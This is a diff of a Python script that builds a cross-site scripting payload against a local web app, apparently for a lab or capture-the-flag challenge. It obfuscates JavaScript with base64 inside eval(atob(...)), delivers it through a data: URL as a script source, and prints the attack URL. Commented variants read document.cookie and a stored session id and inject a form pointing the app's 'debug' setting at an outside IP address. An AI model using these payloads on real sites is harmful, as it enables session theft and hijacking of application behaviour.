@@ -5,10 +5,12 @@ from base64 import b64encode
 
 base = "http://localhost:3000/"
 
-name = "embed"
+# name = "embed"
 name = "script"
 
 # payload = "alert(1);"
+# payload = "alert(document.cookie);"
+
 # payload = "localStorage.getItem('sessionid');"
 # payload = "fetch('http://localhost:3000/about', { credentials: 'include'});"
 # payload += '''const form = document.createElement('form');
@@ -21,13 +23,18 @@ name = "script"
 # form.id = 'config';
 # form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
 # document.body.appendChild(form);'''
-payload='''window.open('http://localhost:3000/about');
+#
+# 
+# 
+payload='''
 const form = document.createElement('form');
 form.id = 'config';
-form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
+form.innerHTML = '<input name="debug" />';
 setTimeout(() => {
   parent.document.body.appendChild(form);
-}, 10000);'''
+}, 3000);'''
+
+
 payload = 'eval(atob("'+b64encode(payload.encode()).decode()+'"));'
 src = "data:text/javascript,"+payload
 # payload = '''
@@ -57,7 +64,7 @@ jsbin_p = f"<{name} src=\"{src}\">"
 
 url_p = f"{base}?name={quote(name)}&src={quote(src)}"
 
-# print(jsbin_p)
+print(jsbin_p)
 print(url_p)
 
 
